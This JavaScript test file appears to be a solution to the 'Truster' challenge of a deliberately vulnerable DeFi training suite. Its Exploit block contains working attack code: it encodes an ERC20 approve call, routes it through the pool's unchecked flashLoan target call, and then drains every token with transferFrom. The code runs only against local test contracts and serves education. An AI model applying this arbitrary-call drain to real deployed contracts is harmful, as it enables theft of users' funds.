const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /**
         * @dev
         * The flaw here resides in the flashLoan() function allowing us to do any function call(data parameter) to any address we want (the target parameter).
         * We can encode the ERC20 approve function, with the attacker address and the pool tokens balance as arguments: this will be our "data" argument.
         * Then, by passing the ERC20 DVT token address as the "target" argument, we essentially make the pool contract approve our attacker to withdraw all the tokens in the pool.
         * After calling flashLoan(), we can check that our attacker is approved to withdraw the tokens pool balance, and call transferFrom() to complete the attack.
         */
        const interface = new ethers.utils.Interface([ "function approve(address spender, uint256 amount)" ])

        const data = interface.encodeFunctionData('approve', [
          attacker.address,
          TOKENS_IN_POOL
        ]);
        console.log(`\u001b[1;35mStarting the attack`);
        await this.pool.flashLoan(0, attacker.address, this.token.address, data);

        const allowance = await this.token.allowance(this.pool.address, attacker.address);
        console.log(
          `\u001b[1;36mThe allowance of the attacker is now ${Math.trunc(
            ethers.utils.formatEther(allowance)
          )} DVT`
        );
        await this.token.connect(attacker).transferFrom(
          this.pool.address,
          attacker.address,
          TOKENS_IN_POOL
        );
        /** CODE YOUR EXPLOIT HERE  */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

